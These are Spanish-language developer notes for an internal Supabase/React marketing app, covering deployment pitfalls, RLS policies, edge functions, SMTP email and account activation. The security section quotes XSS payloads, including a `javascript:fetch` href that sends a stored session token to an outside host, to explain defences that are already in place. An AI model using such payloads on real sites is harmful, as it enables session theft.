# The Factory (Tremu) — notas del proyecto

App interna de mercadeo de la Cámara de Comercio de Barranquilla. Vite + React + shadcn/ui +
Zustand + Supabase.

- **Producción:** https://tremubaq.vercel.app (Vercel, team `nivlek02s-projects`, proyecto `tremu`).
  El viejo `the-factory-seven.vercel.app` da 404.
- **Repo:** `Nivlek02/the-factory`, rama de producción `master`.
- **Supabase:** proyecto `yvzpfdwswmjcnipcgclg`. Cuenta `kazuhacoc01@gmail.com`.
- **Versión:** vive **solo** en `package.json` (ver "Versión y aviso de actualización").

> Este archivo es la memoria del proyecto: prioriza **trampas que cuestan un bug** y decisiones que
> no se deducen del código. Si algo de acá se contradice con el código o con la base, manda el
> código — y hay que corregir esta nota.

---

## Antes de tocar nada

- **El typecheck real es `npx tsc --noEmit -p tsconfig.app.json`.** `npx tsc --noEmit` a secas **no
  compila nada** (el `tsconfig.json` raíz tiene `"files": []` + `references`) y da un exit 0 falso.
  Hoy el proyecto está en **cero errores**: cualquier error que salga es de tu cambio.
- `npm run build` tiene que quedar limpio. No hay test runner (ni vitest ni jest) — la verificación
  se hace con scripts sueltos y con Playwright (ver "Verificación").
- **`vercel.json` necesita el bloque `rewrites`** o toda ruta profunda (`/login`, `/settings`,
  `/board/:id`, `/activar`) da 404: `dist/` solo contiene `index.html`. El rewrite excluye
  `assets/`, `version.json` y `logo-email.png`. **Cualquier archivo estático nuevo en la raíz hay
  que excluirlo ahí o Vercel devolverá `index.html` en su lugar** (ya pasó dos veces: con
  `version.json` el aviso de versión no habría aparecido nunca, y con el logo del correo salía un
  icono roto).
- **`vercel.json` NO admite comentarios, ni siquiera con la convención `"//"`.** Vercel lo valida
  contra un schema estricto y **falla el build entero**: `The vercel.json schema validation failed:
  headers[1] should NOT have additional property //`. Costó **4 despliegues**: el `"//"` entró en
  v1.10.3 y desde ahí producción se quedó congelada en v1.10.2 — cada push fallaba en Vercel
  mientras en local `npm run build` seguía pasando, así que no se notó. **Lo que haya que explicar
  de esa configuración va acá, no en el JSON.**
  - `/assets/(.*)` va con `max-age=31536000, immutable` porque Vite le pone un hash de contenido al
    nombre: ese archivo nunca cambia. Por defecto Vercel los sirve con `must-revalidate`, así que
    el navegador preguntaba por cada archivo en cada carga (recibía 304, no lo volvía a bajar, pero
    pagaba el viaje: ~615 ms por recarga).
  - **`index.html` y `version.json` tienen que seguir revalidando** o nadie vería nunca una versión
    nueva.
- **Un despliegue que falla no se ve desde acá**: el sitio sigue sirviendo el último build bueno,
  sin ningún síntoma salvo que la versión no sube. Si `package.json` dice una versión y
  `https://tremubaq.vercel.app/version.json` dice otra, **el deploy está roto** — mirar
  Deployments en Vercel, no el código.
- Env vars de Vercel (`VITE_SUPABASE_URL`, `VITE_SUPABASE_PUBLISHABLE_KEY`) se gestionan por API con
  un token personal. Ojo al pegar keys a mano: ya pasó que un salto de línea se convirtió en
  espacios en medio del JWT y lo invalidó (`401 Invalid API key`). En `.env` los valores van **entre
  comillas**; al parsearlos hay que quitarlas y **no partir por `=` a secas** (los JWT llevan `=`
  de padding).

---

## Seguridad y permisos

### RLS
- **`usuarios_roles`** (el directorio del equipo): SELECT para cualquier autenticado — la app
  necesita la lista para asignar tareas. **Escribir solo si el rol es Estratega o Soporte**, vía
  `public.puede_gestionar_usuarios()`, que es **SECURITY DEFINER a la fuerza**: una policy sobre
  `usuarios_roles` que consulte `usuarios_roles` se evalúa recursivamente contra sí misma.
  No abre a `anon` a propósito: son 22 nombres y correos personales, y la publishable key es
  pública y va en el bundle.
- **`factory_projects`, `tasks`, `task_comments`**: cerradas a `authenticated`
  (migración `20260729000000`). Antes estaban `TO anon USING (true)` para SELECT/INSERT/UPDATE/
  **DELETE**, o sea que cualquiera con la publishable key —que va en el JS— podía leer, modificar y
  borrar todas las campañas sin cuenta. El gate de `App.tsx` solo esconde la UI, no protege datos.
- **`activacion_config`**: RLS activa y **sin ninguna policy** → inalcanzable desde el navegador. La
  edge function la lee porque el service_role bypassea RLS.
- `profiles` y `user_roles` quedaron **vacías y muertas** (enum de roles viejo). No se borraron.
- **Storage `task-attachments`**: subir y borrar solo `authenticated`, pero la lectura es
  **`{public}`** — cualquiera con la URL de un archivo lo abre sin cuenta. **Decisión consciente del
  usuario (2026-07-29): se deja así.** Las rutas llevan un id aleatorio, así que no se adivinan,
  pero las URLs quedan guardadas en las campañas y en el Markdown exportado. Cerrarlo es pasar el
  bucket a privado y cambiar `getPublicUrl` → `createSignedUrl` resolviendo al mostrar (las URLs ya
  guardadas dejarían de servir directo).

**Auditoría del 2026-07-29** (`pg_policies` sobre `public` y `storage`): **no queda ninguna policy
con `anon`**. La única `{public}` es el SELECT de los adjuntos, ya explicado.

**Lección de esa auditoría — mirar las policies que YA hay antes de crear otras.** La migración
`20260729000000` asumió que `tasks`/`task_comments` tenían las policies `anon` de `20260106024406`;
Postgres avisó con NOTICE que **no existían** (esa migración vieja nunca llegó a este proyecto:
esas dos tablas estaban restringidas desde `20251217203726`). Quedaron dos juegos equivalentes, y
eso **rompió una restricción real**: `task_comments` tenía `"Authenticated users can edit recent
comments"` (solo 10 minutos) y un `USING (true)` al lado la anulaba — **entre policies permisivas
gana la más laxa**. Se corrigió con `20260729010000`, que borra las duplicadas.

**Dos reglas que ya costaron bugs:**
1. Un INSERT rechazado por RLS **falla en silencio** — solo se ve en la consola del navegador.
2. Un UPDATE sin permiso **no da error**: RLS *filtra filas*, así que vuelve `error: null` con **0
   filas**. Hay que mirar el conteo con `.select()`, no solo `error` (lo hacen `updateUser` y
   `deleteUser` en `authStore`).

### Roles
**Agregar un rol de equipo toca 4 sitios, y si falta uno el rol queda a medias:**
1. `AppRole` + `ROLE_LABELS` (`authService`) — la etiqueta va con tilde: `Videógrafo`.
2. El **check constraint** de `usuarios_roles.rol` (migración). Sin esto, guardar la persona con
   ese rol rebota con `usuarios_roles_rol_check` → "Ese rol no es válido".
3. `DEFAULT_ROLES` + `ASSIGNABLE_ROLE_IDS` en `rolesStore`, **subiendo `version`** del `persist`:
   ese store vive en `localStorage` y `migrate` solo corre si la versión guardada es menor, así
   que sin subirla el rol nuevo no le aparece a nadie que ya haya abierto la app (o sea, a nadie).
4. `LETRA_POR_ROL` en `factoryStore`, para el código de tarea.

Un rol desconocido en la tabla **ya no cae a `soporte`** (`ROL_DESCONOCIDO = 'copy'`): soporte es
rol gestor, así que una etiqueta nueva convertía a esa persona en gestora a los ojos del front
(la base la frenaba igual, pero veía botones que fallaban).

`usuarios_roles.rol` guarda la **etiqueta** ('Copywriter', 'Estratega'…) con un check constraint;
`authService` la traduce al id interno (`copy`, `estratega`…) con un mapa inverso de `ROLE_LABELS`.
El rol es **informativo en todas partes menos en la gestión de usuarios**, que es el único lugar
donde decide permisos (`canManageUsers` en el front + la policy en la base; la base es la que
manda). `CARGO_POR_USUARIO` permite mostrar un cargo distinto por persona sin cambiar su rol real.

### Edge functions
**Son 3, todas desplegadas y todas en uso:** `admin-usuarios`, `activar-acceso`,
`notificar-correo`. No hay ninguna función muerta en el repo.

Se borraron cuatro, y conviene saber por qué para no resucitarlas:
`create-initial-user` y `update-user-password` validaban el rol contra `user_roles` (vacía desde la
migración del directorio), así que daban 403 siempre — las reemplazó `admin-usuarios`.
`send-notification` era del kanban viejo (posteaba a un webhook de n8n) y recibía **las direcciones
de correo desde el navegador**: un relay abierto esperando a ser desplegado. Y `admin-set-password`
no validaba **nada**: recibía `{email, password}` y cambiaba la contraseña de cualquiera.
**Si alguna reaparece en el repo, no desplegarla.**

Las tres desplegadas usan service_role, que **bypassea toda RLS**, así que la autorización se hace
a mano dentro de la función:
- **`admin-usuarios`** (`verify_jwt: true`) — único camino a `auth.users` desde el navegador.
  Exige JWT válido → verifica contra `usuarios_roles` que quien llama sea Estratega/Soporte →
  **relee la fila objetivo de la base por `id`**, nunca confía en el email del body. Acciones:
  `set-email` (cambia auth.users **y** el directorio, o quedarían peleados), `set-password`,
  `create-access`.
- **`notificar-correo`** (`verify_jwt: true`) — exige JWT y que quien llama exista en el
  directorio, **sin exigir rol de gestor** (cualquiera del equipo notifica al trabajar).
- **`activar-acceso`** (`verify_jwt: false`, **pública a la fuerza**: quien la usa todavía no tiene
  cuenta). Ver "Activación de cuentas".

### XSS — `dangerouslySetInnerHTML`
La descripción de la campaña, los entregables y los comentarios son **HTML del editor** y se
pintan con `dangerouslySetInnerHTML`. **Siempre a través de `dangerousHtml()` de
`src/lib/sanitizeHtml.ts`** (DOMPurify con lista blanca). Sin eso es un XSS almacenado: un
`<img src=x onerror=…>` guardado en un entregable se ejecuta en el navegador de cualquiera que abra
la campaña y puede robar la sesión de `localStorage` — y si la víctima es Estratega/Soporte, con
ella se gestiona el equipo. Ojo: un `<script>` inyectado por innerHTML no corre, pero
`onerror`/`onload` **sí**, así que "no hay `<script>`" no es defensa. La limpieza es **en lectura**,
así que cubre lo que ya está guardado sin migrar nada. `htmlAText` (`campaignMarkdown.ts`) usa
`DOMParser`, que es inerte — ahí no hace falta.

### XSS — el otro camino: `href={...}`
**DOMPurify no cubre los `href` de JSX**, porque ahí no hay HTML que sanear: React escribe el
atributo tal cual llegue. Y **React 18 no filtra `javascript:` en producción** — la comprobación
existe solo en `react-dom.development.js` como un `console.error`; en el bundle de producción el
string ni siquiera aparece (React 19 sí lo bloquea, pero estamos en 18.3). Un
`javascript:fetch('https://…?s='+localStorage.getItem('sb-…-auth-token'))` guardado como "URL del
entregable" o "Link del segmento" se ejecutaba con la sesión de quien lo clicara.

**Toda URL que salga de datos guardados pasa por `esUrlHttp`/`hrefSeguro` de `src/lib/urlSegura.ts`**
(solo http/https, validando con `new URL()` y no con regex: el parser del navegador ya se come
`java\nscript:`, los espacios y los control characters). Se aplica **en lectura**, igual que
DOMPurify. Cuando el valor no pasa, el texto **se sigue mostrando** pero no como enlace — esconder
el dato confundiría más. Los tres sitios eran `DeliverableSummary` (entregable tipo URL),
`FactoryPage` (`segmentLink`) y `WebinarsPage` (`w.link`, **el único dato que se pinta sin haber
pasado nunca por nuestra base**: viene del webhook de n8n).

Las dos copias sueltas de `isValidUrl` (`StrategyBriefPanels`, `BitlyLinkTool`) delegan ahí: si
algún día se relaja la validación, no puede quedar una mitad por detrás. Los `href` de adjuntos
(`a.url`, `attachment.url`) no pasan por acá porque salen de `getPublicUrl` de storage.

---

## Dónde vive cada cosa

Verificado contra la base el 2026-07-29 (sondeando la API tabla por tabla). **No hay ninguna
funcionalidad sin su lugar de guardado**, pero conviene tener claro el mapa porque casi todo lo de
las campañas está en un solo blob y no en tablas por entidad:

| Qué | Dónde |
|---|---|
| Campañas y **todo** su contenido: nodos del flujo, **tareas** (`fabricaBriefs`), **comentarios** e historial de aprobación, canales, loops, etapas, ELMR, motor, métricas, códigos y números | `factory_projects.data` (**un JSONB**) |
| Equipo, roles y quién tiene acceso | `usuarios_roles` |
| Ventana de autoactivación | `activacion_config` |
| Archivos (adjuntos del asistente y de entregables, imágenes del editor) | Storage, bucket `task-attachments` |
| Versión de la app | `version.json` del build (ninguna tabla) |
| Eventos/webinars y el acortador+QR | n8n (fuera de Supabase) |
| Borrador del asistente | `localStorage` del navegador |
| Catálogo de roles (`rolesStore`) | `localStorage` del navegador |

**Ojo con las dos últimas: no están en la base.** El borrador no viaja entre computadores (ya
documentado). El catálogo de roles vive en `localStorage` con `persist` (`factory-roles-store`,
`version: 3`): hoy da igual porque los valores por defecto están en el código y ya nadie los edita
desde la UI, pero si algún día se vuelven a editar, cada persona vería los suyos.

**Tablas huérfanas** (existen, sin lectores ni escritores): `app_version`, `profiles` y
`user_roles`. Las dos primeras se pueden borrar sin más. **`user_roles` NO**: la función
`public.has_role()` la consulta, y esa función se usa en la policy de DELETE del bucket
`task-attachments` — si se borra la tabla, **nadie podrá borrar adjuntos**. Hay que reescribir esa
policy primero.

## Datos de las campañas

Todo vive en el blob **`factory_projects.data` (JSONB)**: nodos del flujo, entregables, canales,
loops, etapas, ELMR, adjuntos. **Agregar un campo no necesita migración de esquema** — se lee con
`?? default` en `rowToProject` y se serializa en `projectToRow`.

**Migraciones en LECTURA** (mismo patrón para todo lo que cambia de forma): `stripApprovalNodes`,
`mergeGuionNodes`, `interaccionesValidas`, `asignarNumerosFaltantes`. Se arregla al leer y no se
toca la base.

### Sesión perdida
`authStore` se suscribe a `onAuthStateChange` y, al quedarse sin sesión, limpia el store (y
`App.tsx` redirige al login) con un aviso de "tu sesión expiró". **Esto no es cosmético desde que la
RLS exige sesión**: sin el listener, el store se queda con `isAuthenticated: true`, `hydrate`
devuelve 0 filas y **la lista de campañas se ve vacía como si las hubieran borrado**, mientras cada
guardado falla en silencio. Pasa al caducar el refresh token o al cambiarle la contraseña a la
cuenta. `cerrandoAdrede` distingue el cierre voluntario para no decirle "expiró" a quien pulsó
"Cerrar sesión". No se llama a supabase dentro del callback (la doc advierte que puede trabarse).

### Adjuntos: todo va a storage
Los archivos de referencia de la campaña, los adjuntos de entregable (`file-upload.tsx`) y las
imágenes del editor **suben a storage y solo se guarda la URL**. Hasta el 2026-07-29 los del
asistente se guardaban en base64 **dentro del blob JSONB**, lo que hacía que cada guardado reenviara
todos los adjuntos y que el borrador reventara la cuota de `localStorage`… y encima ese base64 no se
usaba nunca (solo se mostraba el nombre, sin enlace). `ProjectAttachment.data` quedó **opcional y
solo de lectura** para las campañas que ya lo tienen; `attachmentHref()` decide de dónde bajar el
archivo. Tope de **15 MB** por archivo (`MAX_ADJUNTO_MB`).

### Guardia de escritura obsoleta (`revision`)
Cada escritura reemplaza el proyecto **entero**. Con dos personas a la vez, quien guardaba de
último **pisaba el trabajo del otro sin error ni aviso**: bastaba dejar la pestaña abierta un rato
(nada volvía a leer de la base solo) y tocar cualquier cosa.

Hoy `data.revision` es un contador por campaña. Antes de escribir, `syncProject` compara el de la
base con el último conocido (`revisionConocida`, un `Map` a nivel de módulo — **no** en el objeto
del proyecto: el `setTimeout` captura una instantánea y leerlo de ahí daba falsos conflictos al
hacer dos cambios seguidos). Si el de la base es mayor: **no pisa**, recarga esa campaña y avisa con
un toast. Si la lectura de la revisión **falla**, se guarda igual (perder el cambio por un error
transitorio sería peor) pero queda un `console.warn`: si no, el chequeo se desactivaría en silencio.

Esa lectura pide **solo `data->revision`**, no `data`: el blob puede pesar megas y esto corre antes
de cada guardado. El `select` tipado no digiere una ruta JSON y revienta con `TS2589`, así que lleva
el tipo del resultado a mano.

El hook **`useCampanasFrescas`** (las 3 vistas que leen campañas: La Fábrica, Mis tareas, Reportes)
hace la carga inicial y **relee al volver a la pestaña** — es lo que evita llegar al conflicto. No
relee si hay una escritura propia pendiente (`haySincronizacionPendiente()`).

**`pendingSync` NO alcanza para saber si hay algo pendiente: hay que mirar también
`escriturasEnVuelo`.** `pendingSync` solo guarda el temporizador del debounce y se vacía **en la
primera línea del callback**, o sea justo *antes* de las dos llamadas de red. Eso dejaba una ventana
ciega de medio segundo a dos segundos (leer la revisión + subir el blob, que puede pesar megas) en
la que `haySincronizacionPendiente()` mentía. Un `focus` ahí —volver a la ventana tras mirar otra
cosa: lo más normal del mundo— disparaba `hydrate()`, que traía la fila **todavía vieja** y pisaba
el store: el cambio desaparecía de la pantalla y, si la persona volvía a tocar algo, ese guardado
salía de la copia vieja y **lo borraba también de la base**, sin error y sin aviso. Por eso el
guardado vive en `escribirProyecto` (aparte, para que el `finally` cubra los `return` tempranos) y
`hydrate` **se salta las campañas en vuelo** —ni su fila ni su `revisionConocida`—, que si no el
guardado siguiente veía un falso conflicto.

### Números y códigos
- `FactoryProject.numero` (`#7`) = **máx + 1, no `length + 1`**: borrar la campaña del medio no
  recicla su número. Se calcula en el cliente, así que dos campañas creadas a la vez podían
  compartirlo; `asignarNumerosFaltantes` **repara duplicados al leer** dejándole el número a la más
  vieja (regla determinista por `createdAt`, así todos los navegadores llegan al mismo resultado).
- `FabricaBriefItem.codigo` (`C1`, `D2`, `E1`…): la letra sale del `stageType` del nodo
  (`LETRA_POR_STAGE`), con respaldo por rol para lo legado. El consecutivo se calcula **leyendo los
  códigos ya usados**, no contando tareas, porque las tareas entran por tres caminos distintos.
  `landing_formulario` usa **LF** para no chocar con la **F** del formulario de inscripción.
- **`heredarCodigos` es obligatorio** porque guardar el wizard de edición reconstruye
  `fabricaBriefs` desde cero: sin él, cada "Guardar cambios" repartiría códigos nuevos
  (C1 → C7 → C13). Se recupera por **texto + rol**, emparejando de a uno con `shift` para que dos
  tareas del mismo nombre no se lleven el mismo.

### El wizard de edición reconstruye todo — y por eso hay `fusionarBriefs` (RESUELTO 2026-07-30)
`buildFabricaBriefs` (`CreateProjectWizard`) rearma `fabricaBriefs` **completo, con ids nuevos y en
blanco**, y el `useEffect` que lo llama corre **ya al abrir el diálogo** (deps: canales, loops,
requerimientos, formularioConfig). Esto no era un riesgo teórico: **cada "Guardar cambios", aunque
no se tocara un campo, reemplazaba la lista entera** y se llevaba `deliverableContent`, los
adjuntos, el hilo de `comments` con todo el historial de aprobación, `workflowStatus`, las métricas
y **todas las tareas que no nacen del wizard** (las de `activateNextStage`, el quick-add de los
nodos, las de métricas). Como cada escritura reemplaza el blob, no había forma de recuperarlo.
Medido con la prueba de regresión: una campaña de 6 tareas quedaba en 4, todas vacías.

Hoy `updateProject` pasa por **`fusionarBriefs`** (`factoryStore`), que:
1. empareja por **`texto + rol`**, de a una (`shift`), para que dos tareas homónimas no compartan
   pareja;
2. a la emparejada le devuelve **su `id`** —`sourceBriefId` referencia POR ID, y con uno nuevo la
   pestaña "Paso anterior" deja de encontrar su origen— y todos los `CAMPOS_DE_TRABAJO`;
3. conserva las que quedan sin pareja, **salvo** que las hubiera generado el wizard
   (`origen: 'wizard'`) **y** estén vacías (`tieneTrabajo`).

**`FabricaBriefItem.origen` es la pieza clave.** Solo `buildFabricaBriefs` lo pone. Sin marca —lo
que nació en el flujo **y todo lo legado**— una tarea no se descarta nunca, porque el wizard no
sabría regenerarla. Es conservador a propósito y se autocorrige: tras el primer guardado, todo lo
del plan queda marcado.

**Efecto de borde asumido:** cambiarle la fecha o el segmento a un canal cambia el *texto* de su
tarea, así que no empareja. Si ya tenía trabajo quedan **las dos** (la vieja con su contenido, la
nueva vacía) y hay que borrar la que sobra con "Eliminar tarea". Es la decisión correcta: un
duplicado se ve y se arregla; un entregable borrado en silencio, no.

`limpiarNodosMuertos` completa el arreglo: al quitar un canal, `syncCanalNodes` borra el nodo y las
tareas rescatadas quedaban con un `currentNodeId` colgando — invisibles en Flujo de trabajo
(`briefsForNode` no las halla en ningún nodo) pero contando en "Mis tareas" y Reportes, **sin forma
de abrirlas ni de borrarlas**. Se les pone `currentNodeId: null` y vuelven a caer en las heurísticas
por rol/texto.

---

## Flujo de trabajo (los nodos)

Cadena base: **Copys → Diseño de piezas → Envío de acciones**. Copys **se bifurca en cuatro ramas
que no se cruzan**:
- → **Diseño** (cualquier copy normal). La tarea se renombra al nacer con `nombreDePieza`
  (`Redactar copy para Correo — X` → `Diseño de pieza para Correo — X`).
- → **Call Center** (solo el guion de la llamada, `isCallCenterGuion`). Checkpoint **único** por
  nodo.
- → **Producción de video** (solo el guion del video, `isVideoGuion`). **No es `unico`**: cada
  guion aprobado es un video distinto que hay que producir, a diferencia del registro de Call
  Center, que es un solo checkpoint por campaña. El nodo lleva `roleId: 'videografo'` real.
- → **Formulario de la landing → Cargue de la landing** (solo `Copy de landing`, `isLandingCopy`).

**Cada rama nueva que salga de Copys hay que restarla de `avanzaDesde('diseno', …)`**, o el guion
también generaría una pieza de diseño.

Los demás nodos (Pauta, BTL, KAM, Relacionamiento, Call Center) **nacen del Plan de canales**, no de
un checkbox: `syncCanalNodes` los agrega y los quita al agregar o quitar canales, igual que
`syncRequerimientoNodes` con Landing/Formulario.

Quién dispara qué vive en la tabla `AUTO_ADVANCE` + el predicado `avanzaDesde()`
(`StrategyBriefPanels.tsx`). Al aprobar, la tarea nueva hereda `fechaAccion` y guarda
`sourceBriefId` (referencia **por id**: el diálogo resuelve el original en vivo, así que si el copy
se corrige después se ve corregido).

**Trampas de los nodos:**
- **`roleId` vs `roleLabel`.** El `roleLabel` es texto para mostrar; el `roleId` de una tarea tiene
  que ser el **id** (`diseno`), porque es con lo que `isTaskOwnedBy` decide de quién es. Casi todos
  los nodos tienen `roleId: null`, y antes se caía a la etiqueta ('Diseñador') → **las piezas de
  diseño no le aparecían al diseñador en "Mis tareas"**. Hoy `activateNextStage` traduce con
  `roleIdDeEtiqueta`, y `isTaskOwnedBy` tiene además un **respaldo por etiqueta** que cubre todo lo
  ya guardado en Supabase sin migrar el JSONB. Si agregas un nodo, ponle `roleId` real.
- **Varios nodos comparten `roleLabel`** (Landing/Formulario/Envíos son "Gestor de canales";
  KAM/BTL/Relacionamiento/Call Center son "Estratega"). `briefsForNode` desambigua por
  `currentNodeId` y, para lo legado sin él, por texto de la tarea. `stampCanalNodeIds` estampa el
  `currentNodeId` correcto al crear/actualizar, así que las heurísticas de texto son solo red de
  seguridad. La rama de `landing` se evalúa **antes** del filtro por rol, porque ese nodo cambió de
  rol (Gestor de canales → Soporte) y lo viejo ya no coincide.
- El nodo Envío de acciones usa `DeliveryBriefPanel`, no `ContentBriefPanel` — cuando agregues algo
  a "cualquier nodo", verifica que Envíos también lo tenga (ya se olvidó una vez).

---

## Fechas, urgencia y métricas

- **Semáforo** (`src/lib/urgencia.ts`): rojo ≤2 días (incluye vencidas), amarillo ≤7, verde >7.
  `parseISOLocal` parsea a mano porque **`new Date('2026-07-20')` se interpreta como UTC** y en
  Colombia (UTC-5) mostraría el día anterior. Mismo motivo en `formatFecha` de la edge function.
- `fechaAccion` se siembra desde `CanalRow.dia` y es editable desde la tarea. En
  `buildFabricaBriefs` viaja en una variable de bucle que **se resetea a null al salir**, o
  Landing/Loops heredarían la fecha del último canal.
- **Las tareas de métricas NO heredan fecha** a propósito: heredar la del envío las dejaría en rojo
  al día siguiente de enviar.
- **Todo lo que lee el título de una tarea de métricas vive en `src/lib/metricas.ts`** — canal,
  campos del formulario, nombre de la tarea y el "¿ya existe?". Antes eso estaba repetido en tres
  lugares y dos cortaban con `/…de (\w+)/`. La tarea se llama
  `Recolectar métricas de {canal}{ — fecha — segmento}`: **conserva la referencia del toque a
  propósito**, porque una campaña manda varios correos y con el nombre a secas solo se creaba la
  del primero (los demás envíos se quedaban sin métricas). El dedup es por **`sourceBriefId`**, no
  por nombre; las tareas de métricas viejas no lo tienen y se siguen tratando como la única de su
  canal para no duplicarlas al reguardar un envío antiguo.
- **Dashboard de métricas: solo Correo, WhatsApp y SMS** (`esCanalMedido`). Muestra Enviados +
  Clics, y Apertura **solo en Correo** (`mideApertura`), espejo de los campos que pide el formulario
  de `FactoryPage`. Si ese formulario cambia, hay que actualizar esas funciones o el dashboard
  seguirá escondiendo datos. `enviadosDe()` hace `enviados || baseTotal`: **si quitas ese fallback,
  las métricas cargadas antes del 2026-07-28 se ven en cero.** Pauta sí genera métricas, solo se
  ocultan de este tab. Call Center nunca las generó.
- Cortar el nombre del canal **por prefijo**, nunca con `/…de (\w+)/`: ese `\w+` parte "Call
  Center" en "Call".

---

## Correo (FUNCIONANDO)

**Transporte: Gmail por SMTP, único.** Secrets: `GMAIL_USER`, `GMAIL_APP_PASSWORD`, `APP_URL`
(+ `MAIL_FROM_NAME` opcional). **Sin modo de prueba: los correos van a sus destinatarios reales.**

- **Se descartó Resend** porque sin dominio verificado solo entrega a la dueña de la cuenta, y el
  DNS de `camarabaq.org.co` (Microsoft 365) no dependía de nosotros. Con SMTP de Gmail **el que
  envía es Google**, así que sale alineado con SPF/DKIM y no cae en spam — con un tercero enviando
  "desde" un gmail, sí.
- **Contraseña de aplicación, NO OAuth** (el token de OAuth caduca cada 7 días en modo Testing). La
  de aplicación no caduca, pero **se revoca sola si se cambia la contraseña de la cuenta de
  Google**: si el correo se cae de golpe, eso es lo primero que hay que mirar.
- **`denomailer` MATA el worker** de Supabase: 500 sin cuerpo, sin cabeceras CORS (se ve como un
  error de CORS engañoso) y **sin entrar al `catch`** — no es una excepción, es el worker
  muriéndose. Se aisló desplegando un evento que solo hacía `Deno.connectTls` a smtp.gmail.com:465:
  respondió `220`, o sea que **el runtime sí permite sockets TLS** y el problema era la librería.
  Por eso hay un **cliente SMTP propio** (~90 líneas). Ojo: esta versión del CLI **no tiene
  `functions logs`**.
- Trampas del cliente SMTP: las respuestas multilínea van `250-…` y **cierran con `250 ` (código +
  espacio)** — sin esperar esa línea el siguiente comando se desincroniza; las cabeceras son ASCII,
  así que el asunto va como **palabra codificada RFC 2047**; el cuerpo va en **base64**, lo que de
  paso elimina el *dot stuffing* y las líneas largas; el `AUTH PLAIN` se loguea como
  `<comando oculto>`. `GMAIL_APP_PASSWORD` se limpia de espacios (Google la muestra en bloques
  de 4).
- **Todo lo que va a una cabecera o a un comando SMTP pasa por `unaLinea()`**, y los destinatarios
  por `correoValido()`. Un `\n` en el asunto (que lo arma el cliente) permitiría inyectar un `Bcc:`
  y convertir esto en relay. No basta con confiar en el filtro de `cabecera()`: su regex usa `$`,
  que en JS **también matchea antes de un `\n` final**.
- **Se manda un correo por destinatario**, no uno con todos en el `to`: el directorio tiene correos
  personales y no tienen por qué verse entre ellos. Tope de una cuenta Gmail gratuita: ~500/día, y
  el sistema manda **un correo por rol, no por tarea**.
- **Cada destinatario va en su propio `try`, y eso NO es cosmético.** El `try` envolvía el bucle
  entero, así que un solo rechazo —una dirección del directorio que Gmail no acepta (se escriben a
  mano) o la cuota diaria agotándose a mitad de la lista— abortaba el resto: **los que venían
  después no recibían nada**. Y no lo notaba nadie: notificar es fire-and-forget y el único rastro
  era un `console.warn` en el navegador de quien disparó la acción, que no es ninguno de los que se
  quedaron sin correo. Hoy un fallo recuperable se anota, se manda `RSET` (un RCPT rechazado deja el
  `MAIL FROM` abierto) y se sigue; solo `conexionPerdida` corta el envío. La función responde
  `parcial: true` con la lista de `fallidos` y loguea **`ENVIO_PARCIAL`** — ese log es lo único que
  permite enterarse de que a alguien dejaron de llegarle los avisos. `destinatarios` cuenta los que
  **salieron**, no los previstos (antes reportaba el total aunque no hubiera salido casi ninguno).

**Regla de oro del lado del navegador:** el cliente **NUNCA manda direcciones de correo**. Solo dice
qué pasó, en qué campaña, sobre qué tareas y qué **rol** es responsable; la función resuelve los
correos contra `usuarios_roles`. Si el cliente mandara el `to`, esto sería un **relay abierto**.

**Los 4 eventos y dónde se enganchan:**
- `tarea.asignada` sale del **store** (`addFabricaBriefs` + `addProject`), no de los paneles:
  `addFabricaBriefs` es el único camino por el que entra una tarea a una campaña existente, así que
  cubre de una el quick-add de los ~6 paneles **y** lo que siembra `activateNextStage`. `addProject`
  hace falta aparte porque el lote del wizard se escribe directo en el objeto.
  **`updateProject` NO notifica a propósito**: reconstruye `fabricaBriefs` completo en cada guardado
  y mandaría una avalancha.
- `tarea.en_revision` → a la **estratega de la campaña** (por `strategistName`, que es el nombre, no
  un id), con fallback a todas las Estrategas.
- `tarea.aprobada` / `tarea.correccion` → al rol responsable del entregable.
- Destinatarios = miembros del grupo de rol en **esa** campaña y, si está vacío, todos los del
  directorio con ese rol. Es la misma regla de `isTaskOwnedBy`, así que **el correo coincide con lo
  que la persona ve en "Mis tareas"**. Nadie se notifica a sí mismo.
- **Notificar nunca puede romper ni frenar la acción del usuario**: todo es fire-and-forget y los
  errores solo van a `console.warn`.

**Para probar sin tocar una campaña** (POST con token de sesión a
`…/functions/v1/notificar-correo`): `{"evento":"preview"}` devuelve el **HTML** sin enviar nada;
`{"evento":"prueba"}` lo **envía**, y solo a quien llama. `enviarCorreoDePrueba()` sigue exportada
en `emailNotifications.ts` sin que nadie la llame — devolver el botón de Ajustes es solo UI.

**La plantilla no se toca con criterio de página web:** tablas anidadas (Outlook renderiza con el
motor de Word), **estilos en línea** (Gmail borra el `<style>` en varios clientes; el `<style>` solo
lleva el `@media`, que es un extra), logo en **PNG** (los clientes no renderizan SVG) y el diseño
**no depende del logo** porque casi todos bloquean imágenes remotas. Al rasterizar
`public/fabrica-logo.svg` hay que **inyectarle `viewBox="0 0 1254 1254"`**: no lo trae, así que
cambiarle el tamaño lo *recorta* en vez de escalarlo (el primer intento salió en blanco).

**Un fallo que ya costó tiempo:** `error.context` de `functions.invoke()` es `any` y cambia según el
tipo de fallo — `Response` para un no-2xx, el `TypeError` crudo del fetch para un fallo de red/CORS.
Llamarle `.json()` a lo segundo tiraba una excepción que **rechazaba la promesa** y dejaba el botón
cargando para siempre. `motivoDelError()` comprueba `instanceof Response` antes de tocarlo, e
`invocar()` **siempre resuelve** (try/catch + timeout de 20s).

---

## Login y activación de cuentas

- Login real de Supabase Auth en `/login`. `App.tsx` manda toda ruta sin sesión a `/login` (salvo
  `/activar`) y `/login` → `/` con sesión. `authStore.initialize()` restaura la sesión; si hay
  sesión válida pero **sin fila enlazada en `usuarios_roles`, no se deja pasar**.
- Los usuarios sin `user_id` caen a su id de tabla como `userId`: siguen siendo **asignables** en
  tareas, pero `loginUser` los rechaza. En Ajustes se ven con el badge **"Sin acceso"** (se deriva
  de `userId === id`). Poner una contraseña a alguien "Sin acceso" **le crea la cuenta**.
- **"Nuevo Usuario" no crea acceso**, solo directorio: el Admin API exige service_role (imposible en
  el navegador) y `signUp` tampoco sirve porque el proyecto tiene `mailer_autoconfirm: false` y **no
  tiene SMTP propio**, así que nadie podría confirmar el correo. Por lo mismo, todo lo que crea
  cuentas usa `email_confirm: true`.
- **`/activar` — el link es COMPARTIDO, no uno por persona.** Se le planteó el riesgo al usuario
  (quien lo tenga y sepa el correo de un compañero puede tomar esa cuenta, y desde que el rol decide
  permisos, tomar una de Estratega/Soporte da gestión del equipo) y **eligió el link compartido**,
  con una **ventana de tiempo** como control. Lo que contiene la función: la ventana validada **en
